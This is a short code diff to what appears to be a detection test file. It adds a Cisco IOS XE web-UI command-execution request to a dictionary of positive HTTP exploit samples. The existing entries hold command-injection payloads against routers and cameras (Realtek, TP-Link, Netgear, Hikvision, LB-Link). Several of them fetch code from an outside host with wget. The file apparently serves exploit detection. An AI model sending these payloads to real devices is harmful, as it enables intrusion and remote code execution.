@@ -56,6 +56,7 @@ POSITIVE = {
     "realtek-sdk-miniigd": http("/picsdesc.xml", "POST", body="<NewInternalClient>`cd /var; wget http://1.2.3.4/x`</NewInternalClient>"),
     "tplink-archer-ax21": http("/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>/tmp/x)"),
     "netgear-cgi-semicolon": http("/cgi-bin/;cd${IFS}/var/tmp;wget${IFS}http://1.2.3.4/x"),
+    "cisco-iosxe-webui": http("/%2577eb%2575i_%2577sma_Http", "POST", body='<request correlator="exec1" xmlns="urn:cisco:wsma-exec"><execCLI><cmd>sh run</cmd></execCLI></request>'),
     "hikvision-weblanguage": http("/SDK/webLanguage", "PUT", body="<language>$(id>webLib/x)</language>"),
     "dlink-getuser": http("/config/getuser?index=0"),
     "lblink-limitclient": http("/goform/set_LimitClient_cfg", "POST", body="time1=00:00-00:00&mac=;wget http://1.2.3.4/x;"),
